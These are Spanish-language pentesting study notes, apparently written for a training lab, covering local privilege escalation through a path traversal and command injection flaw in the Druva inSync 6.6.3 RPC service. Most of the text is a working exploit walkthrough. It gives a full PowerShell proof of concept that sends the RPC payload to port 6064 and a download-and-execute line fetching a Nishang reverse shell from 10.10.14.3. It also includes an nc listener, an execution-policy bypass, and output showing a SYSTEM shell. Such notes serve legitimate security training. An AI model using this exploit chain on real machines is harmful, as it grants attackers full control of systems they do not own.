
## 🧠 Concepto clave
Incluso en sistemas completamente parcheados y bien configurados, la presencia de **software de terceros vulnerable** puede ofrecer un camino directo a SYSTEM. Es habitual encontrar en workstations corporativas aplicaciones de backup, seguridad, monitorización o productividad que instalan servicios que corren con privilegios elevados. Si esos servicios tienen vulnerabilidades — inyección de comandos, path traversal, permisos débiles, puertos RPC expuestos — pueden ser abusados para escalar privilegios independientemente del nivel de parcheo del SO.

Esta sección documenta el caso de **Druva inSync 6.6.3**, una aplicación de backup empresarial con un servicio RPC local vulnerable a **path traversal + command injection** que permite a cualquier usuario del sistema ejecutar comandos como `NT AUTHORITY\SYSTEM`.

| Concepto | Qué es |
|---|---|
| **RPC (Remote Procedure Call)** | Protocolo que permite a un proceso ejecutar código en otro proceso o sistema como si fuera una llamada local. Muchos servicios de Windows exponen interfaces RPC para recibir instrucciones. Si un servicio RPC no valida correctamente los parámetros recibidos, puede ser abusado para ejecutar comandos arbitrarios en el contexto del servicio |
| **Path Traversal** | Técnica que abusa de la falta de validación en rutas de archivos para acceder a directorios fuera del path esperado usando secuencias como `..\..\`. En este caso permite escapar del directorio de Druva y referenciar ejecutables del sistema como `cmd.exe` |
| **Command Injection** | Vulnerabilidad que permite insertar comandos arbitrarios en un campo que será interpretado y ejecutado por el sistema. Combinado con path traversal, permite ejecutar cualquier comando como SYSTEM a través del servicio Druva |

## 📌 Puntos importantes

### Druva inSync — El contexto de la vulnerabilidad

**Druva inSync** es una solución empresarial de backup, eDiscovery y compliance. Su cliente Windows instala un servicio (`inSyncCPHService`) que corre como `NT AUTHORITY\SYSTEM` y expone un servicio RPC local en el puerto **6064** (solo accesible desde localhost). La vulnerabilidad fue descubierta y documentada en 📄 [LPE Path Traversal — matteomalvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) y el PoC está publicado en 📄 [Exploit-DB #49211](https://www.exploit-db.com/exploits/49211).

El fallo consiste en que el servicio RPC acepta una ruta a un ejecutable sin validarla correctamente. Al enviar una ruta con secuencias de path traversal (`..\..\`), es posible escapar del directorio de Druva y apuntar a `cmd.exe` en `System32`, pasándole un comando arbitrario que se ejecutará como SYSTEM.

La versión vulnerable es **6.6.3** y anteriores. Versiones posteriores corrigen la validación de rutas.

> ⚠️ Este tipo de vulnerabilidades son especialmente peligrosas porque no aparecen en escáneres de parches del SO — requieren **enumeración activa de software instalado** como parte del proceso de reconocimiento en el objetivo.

---

### Flujo de explotación — Druva inSync 6.6.3

**Paso 1 — Enumerar software instalado**

> [!info] **wmic product**
> Interfaz WMI que permite consultar el inventario de software instalado en el sistema a través de la clase `Win32_Product`. Devuelve el nombre, versión, fabricante y otras propiedades de cada aplicación registrada en el sistema. Es una de las primeras cosas a enumerar al aterrizar en un sistema Windows — una aplicación de terceros desactualizada puede ofrecer un path de escalada incluso en sistemas completamente parcheados a nivel de SO.

> [!tip] Enumerar todas las aplicaciones instaladas en el sistema
> ```cmd
> wmic product get name
> ```
> `product get name` — Consulta la clase WMI `Win32_Product` y devuelve el nombre de todas las aplicaciones instaladas. Para ver también versiones usar `wmic product get name,version`.

En la salida aparece `Druva inSync 6.6.3` — una versión conocida como vulnerable a LPE mediante su servicio RPC local.

**Paso 2 — Confirmar que el servicio RPC está escuchando en el puerto 6064**

> [!tip] Verificar que el servicio Druva está escuchando en el puerto 6064
> ```cmd
> netstat -ano | findstr 6064
> ```
> `-a` — Muestra todas las conexiones y puertos en escucha.
> `-n` — Muestra direcciones y puertos en formato numérico sin resolver DNS.
> `-o` — Incluye el PID del proceso asociado a cada conexión.
> `findstr 6064` — Filtra la salida mostrando solo las líneas relacionadas con el puerto 6064. El estado `LISTENING` en `127.0.0.1:6064` confirma que el servicio está activo y accesible localmente.

**Paso 3 — Identificar el proceso asociado al PID**

> [!tip] Identificar el proceso que está usando el puerto 6064
> ```powershell
> get-process -Id 3324
> ```
> `-Id 3324` — PID obtenido de la salida de `netstat`. Devuelve el nombre del proceso (`inSyncCPHwnet64`), confirmando que pertenece a Druva inSync.

**Paso 4 — Confirmar que el servicio está corriendo**

> [!tip] Verificar el estado del servicio Druva inSync Client Service
> ```powershell
> get-service | ? {$_.DisplayName -like 'Druva*'}
> ```
> `get-service` — Lista todos los servicios del sistema con su estado actual.
> `? {$_.DisplayName -like 'Druva*'}` — Filtra los servicios cuyo nombre visible empiece por "Druva". El estado `Running` confirma que el servicio está activo y listo para ser explotado.

**Paso 5 — Preparar el payload: Invoke-PowerShellTcp.ps1**

En lugar de simplemente crear un usuario (ruidoso y modificador del sistema), se usa una **reverse shell PowerShell en memoria** para obtener acceso interactivo sin escribir archivos en disco.

> [!info] **Invoke-PowerShellTcp.ps1 (Nishang)** 📄 [Invoke-PowerShellTcp — samratashok/nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
> Script de PowerShell del framework **Nishang** que establece una reverse shell TCP o bind shell completamente en memoria, sin necesidad de escribir archivos adicionales en disco. Al ser PowerShell puro, puede cargarse directamente con `IEX` + `DownloadString` sin tocar el sistema de archivos del objetivo. Nishang es un framework ofensivo completo escrito en PowerShell con herramientas de reconocimiento, escalada, persistencia y exfiltración.

Descargar el script, renombrarlo a `shell.ps1` y añadir al final del archivo la siguiente línea (ajustando IP y puerto):
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Esta línea al final del script hace que se ejecute automáticamente cuando el script sea cargado con `IEX` + `DownloadString`, sin necesidad de llamarla explícitamente.

**Paso 6 — Modificar el PoC de Druva inSync**

El PoC original crea un usuario. Se modifica la variable `$cmd` para que en su lugar descargue y ejecute la reverse shell en memoria:
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

> [!info] **IEX (Invoke-Expression)**
> Cmdlet de PowerShell que evalúa y ejecuta una cadena de texto como código PowerShell. Combinado con `DownloadString`, permite descargar y ejecutar un script remoto directamente en memoria sin escribirlo en disco — una técnica de evasión fundamental en pentesting moderno que evita dejar artefactos en el sistema de archivos del objetivo.

El PoC completo modificado queda así:
```powershell
$ErrorActionPreference = "Stop"

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Puntos clave del PoC:
- `New-Object System.Net.Sockets.Socket` — Crea un socket TCP para conectarse al servicio RPC de Druva en `127.0.0.1:6064`.
- `$header` — Cabecera de handshake del protocolo RPC de Druva: `inSync PHC RPCW[v0002]`.
- `$rpcType` — Tipo de mensaje RPC que activa la funcionalidad vulnerable.
- `$command` — La ruta al ejecutable codificada en Unicode. El path traversal (`..\..\..\..\`) escapa del directorio de Druva para llegar a `cmd.exe` en `System32`.
- `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` — La secuencia `..\..\..` sube tres niveles desde `inSync4` hasta la raíz de C: y baja a `Windows\System32\cmd.exe`.

**Paso 7 — Preparar el entorno en la máquina atacante**

> [!tip] Levantar servidor HTTP para servir shell.ps1 y listener para recibir la reverse shell
> ```bash
> python3 -m http.server 8080
> ```
> ```bash
> nc -lvnp 9443
> ```
> El servidor HTTP en puerto 8080 servirá `shell.ps1` cuando el payload lo solicite.
> El listener en puerto 9443 recibirá la conexión de la reverse shell PowerShell.

**Paso 8 — Bypasear la Execution Policy y ejecutar el PoC en el objetivo**

> [!tip] Deshabilitar la Execution Policy y ejecutar el PoC de Druva
> ```powershell
> Set-ExecutionPolicy Bypass -Scope Process
> .\druva_exploit.ps1
> ```
> `Set-ExecutionPolicy Bypass -Scope Process` — Desactiva las restricciones de ejecución de scripts solo para el proceso actual, sin modificar la política global del sistema. 📄 [15 Ways to Bypass PowerShell Execution Policy — NetSPI](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
> `.\druva_exploit.ps1` — Ejecuta el PoC modificado, que se conecta al puerto 6064, envía el payload RPC y ordena al servicio Druva (corriendo como SYSTEM) que descargue y ejecute `shell.ps1`.

**Resultado esperado en el listener:**
```
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01

PS C:\WINDOWS\system32> whoami
nt authority\system
```

La reverse shell llega como `NT AUTHORITY\SYSTEM` — el servicio Druva ejecutó el comando en su propio contexto de seguridad.

---

## 🔗 Relaciones / Contexto

El caso de Druva inSync ilustra un patrón muy común en entornos corporativos reales: **aplicaciones empresariales legítimas que instalan servicios privilegiados con vulnerabilidades no parcheadas**. A diferencia de los exploits de kernel que requieren sistemas sin parchear a nivel de SO, este vector funciona independientemente del nivel de parcheo de Windows — solo requiere que la aplicación vulnerable esté presente. La lección operativa es clara: la enumeración de software instalado (`wmic product get name,version`) debe ser siempre uno de los primeros pasos al aterrizar en un sistema Windows, y cada aplicación de terceros debe investigarse individualmente en busca de CVEs conocidos. Las organizaciones deberían restringir los derechos de instalación de software a usuarios estándar siguiendo el principio de **least privilege**, e implementar listas blancas de aplicaciones para controlar qué software puede ejecutarse en workstations corporativas.